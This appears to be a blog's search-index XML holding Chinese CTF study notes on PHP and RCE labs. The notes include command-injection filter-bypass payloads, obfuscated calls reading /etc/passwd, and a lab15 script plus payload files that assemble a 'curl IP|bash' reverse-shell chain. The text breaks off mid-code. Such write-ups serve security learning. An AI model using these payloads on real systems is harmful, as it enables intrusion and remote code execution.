<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>php基础</title>
      <link href="/2025/10/02/php%E5%9F%BA%E7%A1%80/"/>
      <url>/2025/10/02/php%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h2 id="php-伪协议"><a href="#php-伪协议" class="headerlink" title="php 伪协议"></a>php 伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p><code>php://input</code> 允许你读取原始的 POST 数据。推荐使用Burpsuite的 Repeater 功能来发送自定义的 HTTP 请求，而不是浏览器插件。</p><h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p><code>php://filter</code> 允许你对文件进行过滤操作，比如编码转换、Base64 编码等。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见php函数</title>
      <link href="/2025/10/02/%E5%B8%B8%E8%A7%81php%E5%87%BD%E6%95%B0/"/>
      <url>/2025/10/02/%E5%B8%B8%E8%A7%81php%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<ol><li><code>strpos()</code></li></ol><p>语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">strpos</span>(<span class="keyword">string</span> <span class="variable">$haystack</span>, <span class="keyword">string</span> <span class="variable">$needle</span>, <span class="keyword">int</span> <span class="variable">$offset</span> = <span class="number">0</span>): <span class="keyword">int</span>|<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>功能：返回子字符串 <code>$needle</code> 在 <code>$haystack</code> 中第一次出现的位置（下标，从 0 开始）。</p><p>返回值：</p><ul><li>找到时：返回位置下标（<code>int</code>）</li><li>找不到：返回 <code>false</code>（<code>bool</code>）</li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE远程代码执行漏洞学习笔记</title>
      <link href="/2025/10/02/RCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/10/02/RCE%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="简析"><a href="#简析" class="headerlink" title="简析"></a>简析</h2><p>RCE（Remote Code Execution，远程代码执行）是一种安全漏洞，允许攻击者在目标系统上执行任意代码。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="NewStar2023-R-C-E"><a href="#NewStar2023-R-C-E" class="headerlink" title="NewStar2023 R!C!E"></a>NewStar2023 R!C!E</h3><h3 id="ctfHub-RCE-eval-执行"><a href="#ctfHub-RCE-eval-执行" class="headerlink" title="ctfHub-RCE-eval 执行"></a>ctfHub-RCE-eval 执行</h3><ul><li><code>exec()</code> 执行”系统命令”</li><li><code>eval()</code> 执行”PHP 代码”</li></ul><h3 id="ctfHub-RCE-命令注入"><a href="#ctfHub-RCE-命令注入" class="headerlink" title="ctfHub-RCE-命令注入"></a>ctfHub-RCE-命令注入</h3><h4 id="无过滤"><a href="#无过滤" class="headerlink" title="无过滤"></a>无过滤</h4><p>使用 <code>&amp;&amp;</code> 连接命令，通过查看源代码找到 flag</p><ul><li><code>;</code> 不管成功失败都继续下一条</li><li><code>&amp;&amp;</code> 前一条成功才执行下一条</li><li><code>||</code> 前一条失败才执行下一条</li><li><code>|</code> 把左边输出当右边输入</li><li><code>(...)</code> 在子 shell 中执行一组命令</li><li><code>%0a</code> 或 <code>%0d</code></li></ul><h4 id="过滤-cat"><a href="#过滤-cat" class="headerlink" title="过滤 cat"></a>过滤 <code>cat</code></h4><p>使用 <code>tac</code> 代替 <code>cat</code></p><p>当 cat 被过滤后，可以使用以下命令进行读取文件的内容：</p><ul><li><code>more</code>：一页一页的显示档案内容</li><li><code>less</code>：与 more 类似，但是比 more 更好的是，他可以 [pg dn][pg up] 翻页</li><li><code>head</code>：查看头几行</li><li><code>tac</code>：从最后一行开始显示，可以看出 tac 是 cat 的反向显示</li><li><code>tail</code>：查看尾几行</li><li><code>nl</code>：显示的时候，顺便输出行号</li><li><code>od</code>：以二进制的方式读取档案内容</li><li><code>vi</code>：一种编辑器，这个也可以查看</li><li><code>vim</code>：一种编辑器，这个也可以查看</li><li><code>sort</code>：可以查看</li><li><code>uniq</code>：可以查看</li><li><code>file -f</code>：报错出具体的内容</li></ul><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><ul><li>使用 <code>&lt;</code> 重定向符代替空格，原理是将 <code>&lt;*</code> 重定向到命令的标准输入</li><li>使用 <code>$&#123;IFS&#125;</code> 代替空格，<code>IFS</code> 是环境变量，表示内部字段分隔符，默认是空格、制表符和换行符</li><li>使用 <code>%09</code> 代替空格，<code>%09</code> 是 URL 编码中的制表符。这其实就是只过滤了一种”空格”导致</li><li><code>&#123;&#125;</code> {cat,&#x2F;f’l’ag} 只在 bash 中可用</li><li>进制 <code>X=$&#39;cat\x20/flag&#39;&amp;&amp;$X</code></li></ul><h5 id="为什么有的时候重定向和通配符不能一起用"><a href="#为什么有的时候重定向和通配符不能一起用" class="headerlink" title="为什么有的时候重定向和通配符不能一起用"></a>为什么有的时候重定向和通配符不能一起用</h5><p>在 shell 中，普通参数会进行路径名扩展（globbing），但重定向的目标文件名通常不做 globbing。</p><ul><li><code>cat%09/fla*</code> → 被 PHP 解码为 <code>cat&lt;TAB&gt;/fla*</code>。<code>TAB</code> 作为分隔符将其拆成两个词：<code>cat</code> 与 <code>/fla*</code>。<code>/fla*</code> 是普通参数，shell 会做 globbing，把其展开为匹配文件（如 <code>/flag</code>），最终执行 <code>cat /flag</code>，读取成功。</li><li><code>cat&lt;/fla*</code> → <code>&lt;</code> 是输入重定向，后面的 <code>/fla*</code> 被当作重定向的目标文件名处理。多数遵循 POSIX 的 shell 不会对重定向的文件名做 pathname 扩展，于是尝试打开字面名 <code>/fla*</code>（通常不存在），因此失败。</li></ul><h4 id="过滤"><a href="#过滤" class="headerlink" title="过滤 /\"></a>过滤 <code>/\</code></h4><p>通过 ls 得知 flag 在 <code>./flag_is_here/flag_22183547332303.php</code> 中</p><ul><li><p>使用 <code>&amp;&amp;</code> 注入进入目录并读取文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;<span class="built_in">cd</span> flag_is_here&amp;&amp;<span class="built_in">cat</span> flag_22183547332303.php</span><br></pre></td></tr></table></figure></li><li><p>使用通配符读取文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&amp;&amp;<span class="built_in">cd</span> flag_is_here&amp;&amp;<span class="built_in">cat</span> f*</span><br></pre></td></tr></table></figure></li><li><p>从 PATH 环境变量取首字符”&#x2F;“：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag_is_here<span class="variable">$&#123;PATH:0:1&#125;</span>flag_252412887014927.php</span><br></pre></td></tr></table></figure></li><li><p>用 <code>$&#123;HOME:0:1&#125;</code> 替代”&#x2F;“：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原: cat /flag</span></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$&#123;HOME:0:1&#125;</span>flag</span><br></pre></td></tr></table></figure></li><li><p>用 tr 生成”&#x2F;“：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> $(<span class="built_in">echo</span> . | <span class="built_in">tr</span> <span class="string">&#x27;!-0&#x27;</span> <span class="string">&#x27;&quot;-1&#x27;</span>)flag</span><br></pre></td></tr></table></figure></li></ul><h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><ul><li>使用 <code>\</code> 转义被过滤的字符</li><li>直接使用通配符，不使用完整字符串</li></ul><h5 id="通配符"><a href="#通配符" class="headerlink" title="通配符"></a>通配符</h5><ul><li><code>*</code>：匹配零个或多个字符。例：<code>*.txt</code></li><li><code>?</code>：匹配单个字符。例：<code>file?.txt</code></li><li><code>[]</code>：匹配方括号内的任意一个字符。例：<code>file[1-3].txt</code></li><li><code>[^]</code>：匹配不在方括号内的字符。例：<code>file[^a-c].txt</code></li><li><code>&#123;&#125;</code>：匹配大括号内的任意一个字符串。例：<code>file&#123;1,2,3&#125;.txt</code></li></ul><p>通过组合上述技巧，可用于绕过 CTF 中一些简单过滤：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;c&#x27;&#x27;at /e&#x27;t&#x27;c/pass?d&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;/???/?at /e&#x27;t&#x27;c/pass?d&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&quot;/???/?at /e&#x27;t&#x27;c/*ss*&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="ctfHub-RCE-文件包含"><a href="#ctfHub-RCE-文件包含" class="headerlink" title="ctfHub-RCE-文件包含"></a>ctfHub-RCE-文件包含</h3><ol><li>文件包含漏洞（File Inclusion）：程序把用户提供的路径或 URL 直接传给语言的包含函数（例如 PHP 的 <code>include</code>&#x2F;<code>require</code>），没有做足够的校验。</li><li>变成 RCE：攻击者把”恶意代码”放到服务器上（或让包含函数访问到带代码的资源），包含后语言解释器会执行这些代码 → 就变成了远程代码执行。</li></ol><h4 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h4><p>LFI（Local File Inclusion，本地文件包含）：只允许包含服务器本地的文件（比如 <code>include($_GET[&#39;f&#39;]);</code>），如果能读到 <code>/etc/passwd</code>、应用日志等，可能被进一步利用。</p><h4 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h4><p>RFI（Remote File Inclusion，远程文件包含）：如果应用允许包含远程 URL（如 <code>http://...</code>），攻击者能让应用直接从远端拉取并执行恶意脚本（更直接的 RCE）。</p><ol><li>确定是否允许远程包含：尝试传入 URL 或确认 phpinfo 中的 <code>allow_url_include</code> 设置为 On。</li><li>上传恶意脚本：如果应用允许文件上传，可以上传一个包含恶意代码的脚本，使用 <code>php://input</code>、<code>data://</code> 等包装器。</li></ol><h3 id="UUCTF-ez-rce"><a href="#UUCTF-ez-rce" class="headerlink" title="UUCTF-ez_rce"></a>UUCTF-ez_rce</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i&#x27;</span>, <span class="variable">$code</span>))</span><br></pre></td></tr></table></figure><p>并未过滤反引号，php 中反引号等同于 <code>shell_exec()</code>；未过滤 <code>()</code>。</p><p><code>print</code> 存在且可用，和 <code>echo</code> 功能接近，唯一显著的行为差别是 <code>print</code> 有返回值且只能输出一个参数。</p><p>转义时注意 <code>\t</code> 会被认为是制表符，所以更好的选择是 <code>c\at</code> <code>`flag.txt`</code></p><h3 id="RCE-labs"><a href="#RCE-labs" class="headerlink" title="RCE-labs"></a>RCE-labs</h3><h4 id="lab02"><a href="#lab02" class="headerlink" title="lab02"></a>lab02</h4><p>拥有执行代码能力的函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func_list</span> = [<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;assert&#x27;</span>,<span class="string">&#x27;call_user_func&#x27;</span>,<span class="string">&#x27;create_function&#x27;</span>,<span class="string">&#x27;array_map&#x27;</span>,<span class="string">&#x27;call_user_func_array&#x27;</span>,<span class="string">&#x27;usort&#x27;</span>,<span class="string">&#x27;array_filter&#x27;</span>,<span class="string">&#x27;array_reduce&#x27;</span>,<span class="string">&#x27;preg_replace&#x27;</span>];</span><br></pre></td></tr></table></figure><ul><li><p><code>eval()</code>：直接执行 PHP 代码字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo &quot;Hello World&quot;;&#x27;</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;system(&quot;whoami&quot;);&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>assert()</code>：在 PHP 5.x 中可执行代码字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&#x27;echo &quot;Hello World&quot;;&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&#x27;system(&quot;whoami&quot;);&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>call_user_func()</code>：动态调用函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="string">&#x27;assert&#x27;</span>, <span class="string">&#x27;echo &quot;Hello&quot;;&#x27;</span>);</span><br></pre></td></tr></table></figure></li><li><p><code>create_function()</code>：创建匿名函数并执行（PHP 7.2 后已废弃）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;echo &quot;Hello World&quot;;&#x27;</span>);</span><br><span class="line"><span class="variable">$func</span>();</span><br></pre></td></tr></table></figure></li><li><p><code>array_map()</code>：对数组每个元素执行回调函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(function(<span class="variable">$cmd</span>)&#123;<span class="keyword">eval</span>(<span class="variable">$cmd</span>);&#125;, <span class="keyword">array</span>(<span class="string">&#x27;echo &quot;Hello&quot;;&#x27;</span>));</span><br></pre></td></tr></table></figure></li><li><p><code>call_user_func_array()</code>：调用函数并传递参数数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;system&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&#x27;assert&#x27;</span>, <span class="keyword">array</span>(<span class="string">&#x27;echo &quot;Hello&quot;;&#x27;</span>));</span><br></pre></td></tr></table></figure></li><li><p><code>usort()</code>：用户自定义排序函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$arr</span>, function(<span class="variable">$a</span>,<span class="variable">$b</span>)&#123;<span class="keyword">eval</span>(<span class="string">&#x27;echo &quot;Hello&quot;;&#x27;</span>); <span class="keyword">return</span> <span class="number">0</span>;&#125;);</span><br></pre></td></tr></table></figure></li><li><p><code>array_filter()</code>：过滤数组元素</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>), <span class="string">&#x27;system&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">array_filter</span>(<span class="keyword">array</span>(<span class="string">&#x27;echo &quot;Hello&quot;;&#x27;</span>), <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;<span class="keyword">eval</span>(<span class="variable">$cmd</span>);&#125;);</span><br></pre></td></tr></table></figure></li><li><p><code>array_reduce()</code>：数组归并计算</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">array_reduce</span>(<span class="keyword">array</span>(<span class="string">&#x27;whoami&#x27;</span>), <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$v</span>,<span class="variable">$cmd</span></span>)</span>&#123;<span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);&#125;);</span><br></pre></td></tr></table></figure></li><li><p><code>preg_replace()</code>：使用 <code>/e</code> 修饰符执行代码（PHP 5.x）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/.*/e&#x27;</span>, <span class="string">&#x27;system(&quot;whoami&quot;)&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br></pre></td></tr></table></figure></li></ul><h4 id="lab03"><a href="#lab03" class="headerlink" title="lab03"></a>lab03</h4><p><code>system()</code> 中的命令记得加 <code>;</code></p><h4 id="lab04"><a href="#lab04" class="headerlink" title="lab04"></a>lab04</h4><p>在 <code>GET</code> 请求中命令链接使用 <code>&amp;&amp;</code>，<code>;</code> 会被当作不同参数的分割</p><h4 id="lab05"><a href="#lab05" class="headerlink" title="lab05"></a>lab05</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">echo</span> <span class="string">&quot;<span class="subst">$(cat /fla\g)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>使用 <code>$()</code> 可以执行子 shell</p><h4 id="lab06"><a href="#lab06" class="headerlink" title="lab06"></a>lab06</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[b-zA-Z_@#%^&amp;*:&#123;&#125;\-\+&lt;&gt;\&quot;|`;\[\]]/&quot;</span>, <span class="variable">$cmd</span>))</span><br></pre></td></tr></table></figure><p>wp</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=/???/?a??64 /??a?</span><br></pre></td></tr></table></figure><p>解释：<code>/???/</code> 匹配 <code>/bin/</code>，<code>?a??64</code> 匹配 <code>base64</code>，<code>/??a?</code> 匹配 <code>/flag</code></p><h4 id="lab07-空格过滤"><a href="#lab07-空格过滤" class="headerlink" title="lab07-空格过滤"></a>lab07-空格过滤</h4><h4 id="lab08-输出重定向"><a href="#lab08-输出重定向" class="headerlink" title="lab08-输出重定向"></a>lab08-输出重定向</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hello_shell</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">/*&gt;/dev/null 将不会有任何回显，但会回显错误，加上 2&gt;&amp;1 后连错误也会被屏蔽掉*/</span></span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>.<span class="string">&quot;&gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用 <code>;</code></p><h4 id="lab09-无字母命令执行"><a href="#lab09-无字母命令执行" class="headerlink" title="lab09-无字母命令执行"></a>lab09-无字母命令执行</h4><p>在终端中，<code>$&#39;\xxx&#39;</code> 可以将八进制 ASCII 码解析为字符，仅基于这个特性，我们可以将传入的命令的每一个字符转换为 <code>$&#39;\xxx\xxx\xxx\xxx&#39;</code> 的形式，但是注意，这种方式在没有空格的情况下无法执行带参数的命令。</p><p>比如 <code>ls -l</code> 也就是 <code>$&#39;\154\163\40\55\154&#39;</code> 只能拆分为 <code>$&#39;\154\163&#39;</code> 空格 <code>$&#39;\55\154&#39;</code> 三部分。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bash-5.1# $<span class="string">&#x27;\154\163\40\55\154&#x27;</span></span><br><span class="line">bash: <span class="built_in">ls</span> -l: <span class="built_in">command</span> not found</span><br><span class="line"></span><br><span class="line">bash-5.1# $<span class="string">&#x27;\154\163&#x27;</span> $<span class="string">&#x27;\55\154&#x27;</span></span><br><span class="line">total 4</span><br><span class="line">-rw-r--r--    1 www-data www-data       829 Aug 14 19:39 index.php</span><br></pre></td></tr></table></figure><h4 id="lab10-二进制执行"><a href="#lab10-二进制执行" class="headerlink" title="lab10-二进制执行"></a>lab10-二进制执行</h4><p>槽点：</p><ol><li>二进制的时候空格命令不用分割</li><li>直接传入的 <code>#</code> 会被当作特殊字符，要进行 URL encode</li></ol><h4 id="lab11"><a href="#lab11" class="headerlink" title="lab11"></a>lab11</h4><p>同上</p><h4 id="lab12"><a href="#lab12" class="headerlink" title="lab12"></a>lab12</h4><blockquote><p>由于转义以及 PHP 中 system 函数的缺陷（指无法像 subprocess 那样提供一个完全一致的 Bash 环境？），这里使用 Flask 环境下的 subprocess 模块来执行命令。当然这也暴露出该方法的局限性。</p></blockquote><p>解答同上</p><h4 id="lab14-7-字节"><a href="#lab14-7-字节" class="headerlink" title="lab14-7 字节"></a>lab14-7 字节</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /f\*</span><br></pre></td></tr></table></figure><h4 id="lab15-5-字节"><a href="#lab15-5-字节" class="headerlink" title="lab15-5 字节"></a>lab15-5 字节</h4><p><a href="https://mp.weixin.qq.com/s?__biz=MzkzNDYwOTM1Nw==&mid=2247483838&idx=1&sn=307ceadf62e0f8c5d8fcde9dd0fc7d1b&chksm=c2bbe91cf5cc600a6acdd1faed9f707c4f91f8489792d877eb4658e8a5a979019d6c1c5a87fe&cur_album_id=3900985574500286472&scene=189#wechat_redirect">blog1</a></p><ol><li>将命令拆分为小于字符限制的小块用<code>\</code>链接<ol><li>因为要使用<code>sh -t</code>，所以要倒序处理命令</li><li>命令中的特殊字符需要转义</li></ol></li><li>将命令作为文件名</li><li>使用 ls -t 再把文件名写入一整个文件<ol><li>但 ls -t&gt;a 也超出限制，所以要拆分</li><li>这次使用字典序，通过写入两次连接首位（这玩意到底是谁研究的）</li></ol></li><li>再使用 sh b sh a 执行该文件</li></ol><p>反弹 shell</p><p>wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">TIME = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:8080/&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url+<span class="string">&quot;?reset=1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    payload = f.read()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> payload.split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">        <span class="keyword">if</span> line.strip():</span><br><span class="line">            r = requests.get(url + <span class="string">&quot;?cmd=&quot;</span> + quote(line.strip()))</span><br><span class="line">            time.sleep(TIME)</span><br><span class="line">            <span class="built_in">print</span>(r.status_code)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    payload = f.read()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> payload.split(<span class="string">&quot;\n&quot;</span>):</span><br><span class="line">        <span class="keyword">if</span> line.strip():</span><br><span class="line">            r = requests.get(url + <span class="string">&quot;?cmd=&quot;</span> + quote(line.strip()))</span><br><span class="line">            time.sleep(TIME)</span><br><span class="line">            <span class="built_in">print</span>(r.status_code)</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">r = requests.get(url+<span class="string">&quot;?cmd=&quot;</span>+quote(<span class="string">&quot;sh b&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">r = requests.get(url+<span class="string">&quot;?cmd=&quot;</span>+quote(<span class="string">&quot;sh a&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p>payload1</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;\ \</span><br><span class="line">&gt;-t\</span><br><span class="line">&gt;\&gt;a</span><br><span class="line">&gt;ls\</span><br><span class="line">ls&gt;b</span><br><span class="line">ls&gt;&gt;b</span><br></pre></td></tr></table></figure><p>payload2</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&gt;bash</span><br><span class="line">&gt;5\|\</span><br><span class="line">&gt;19\</span><br><span class="line">&gt;4.\</span><br><span class="line">&gt;7.5\</span><br><span class="line">&gt;5\</span><br><span class="line">&gt;23.\</span><br><span class="line">&gt;\ 1\</span><br><span class="line">&gt;url\</span><br><span class="line">&gt;c\</span><br></pre></td></tr></table></figure><p>靶机中的文件</p><p><img src="/83d00291ace7ff7aa63384bd95188337.png" alt="alt text"></p><p>cat b</p><p><img src="/99dd0d76a7e1e82ac86a31ff4fe0ef99.png" alt="alt text"></p><p>cat a</p><p><img src="/image-2.png" alt="alt text"></p><p>槽点</p><ul><li>神网络延迟，因为 ls -t 依靠文件修改时间排序，而所以要手动 sleep 以下</li><li>神秘靶机，自己建的 Docker 可以过，靶场过不了</li></ul><h4 id="lab16-4-字节"><a href="#lab16-4-字节" class="headerlink" title="lab16-4 字节"></a>lab16-4 字节</h4><p>尝试替换上文 ls&gt;&gt;b</p><p>使用</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 